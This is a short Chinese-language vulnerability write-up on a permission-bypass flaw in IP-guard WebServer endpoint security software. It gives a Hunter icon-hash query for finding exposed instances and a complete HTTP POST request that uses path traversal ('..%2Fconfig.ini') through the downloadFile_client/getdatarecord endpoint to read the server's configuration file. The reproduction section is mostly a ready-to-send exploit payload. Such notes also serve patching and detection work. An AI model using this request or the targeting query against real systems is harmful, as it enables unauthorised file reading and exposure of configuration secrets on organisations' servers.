# IP-guard WebServer 权限绕过漏洞

# 一、漏洞简介
IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。由于IP-guard WebServer的权限验证机制中存在设计缺陷，远程攻击者能够规避安全验证，通过后端接口执行文件的任意读取和删除操作。

# 二、影响版本
+ IP-guard

# 三、资产测绘
+ hunter`web.icon=="210a3c89d4ab5effa18d6dd7a9627376"`
+ 特征

![1699584205812-20797c54-6a49-4a18-a038-f0d965e86b5f.png](./img/KINBd9d7qOP907Rm/1699584205812-20797c54-6a49-4a18-a038-f0d965e86b5f-935578.png)

# 四、漏洞复现
```plain
POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
```

![1713513510100-89d8adee-54fa-473d-9e4b-7066cb308103.png](./img/KINBd9d7qOP907Rm/1713513510100-89d8adee-54fa-473d-9e4b-7066cb308103-142878.png)



> 更新: 2024-04-19 16:02:33  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dlylco77v8avu2od>